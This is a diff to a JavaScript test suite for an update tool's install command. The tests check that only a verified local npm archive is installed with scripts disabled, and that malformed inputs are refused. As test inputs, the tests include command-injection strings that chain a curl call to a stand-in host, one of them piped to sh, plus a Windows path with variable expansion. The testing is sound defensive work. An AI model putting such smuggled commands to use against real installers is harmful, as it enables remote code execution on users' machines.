@@ -182,28 +182,33 @@ describe('bounded file reads', () => {
 });
 
 describe('update install command', () => {
-  it('never hands the argument list to a shell', () => {
-    expect(installCommand('1.2.3', 'linux')).toEqual({
+  it('installs only the verified local archive with scripts disabled', () => {
+    const linuxArchive = '/tmp/gatecrash-update-a1b2/xzycd-gatecrash-1.2.3.tgz';
+    expect(installCommand(linuxArchive, 'linux')).toEqual({
       command: 'npm',
       args: [
         'install',
         '--global',
         '--ignore-scripts',
-        '--registry=https://registry.npmjs.org/',
-        '@xzycd/gatecrash@1.2.3',
+        linuxArchive,
       ],
     });
-    expect(installCommand('1.2.3', 'win32').args).toEqual([
-      '/d', '/s', '/c', 'npm',
+    const windowsArchive = 'C:\\Temp\\gatecrash-update-a1b2\\xzycd-gatecrash-1.2.3.tgz';
+    expect(installCommand(windowsArchive, 'win32').args).toEqual([
+      '/d', '/s', '/v:off', '/c', 'npm',
       'install',
       '--global',
       '--ignore-scripts',
-      '--registry=https://registry.npmjs.org/',
-      '@xzycd/gatecrash@1.2.3',
+      windowsArchive,
     ]);
   });
 
-  it('refuses a version that is not three plain numbers', () => {
-    expect(() => installCommand('1.2.3 && curl evil.example.test | sh')).toThrow(/unrecognised/);
+  it('refuses unexpected names and shell metacharacters', () => {
+    expect(() => installCommand('/tmp/gatecrash-1.2.3.tgz && curl evil.test', 'linux'))
+      .toThrow(/unrecognised/);
+    expect(() => installCommand(
+      'C:\\Temp%PATH%\\xzycd-gatecrash-1.2.3.tgz',
+      'win32',
+    )).toThrow(/unsafe archive path/);
   });
 });
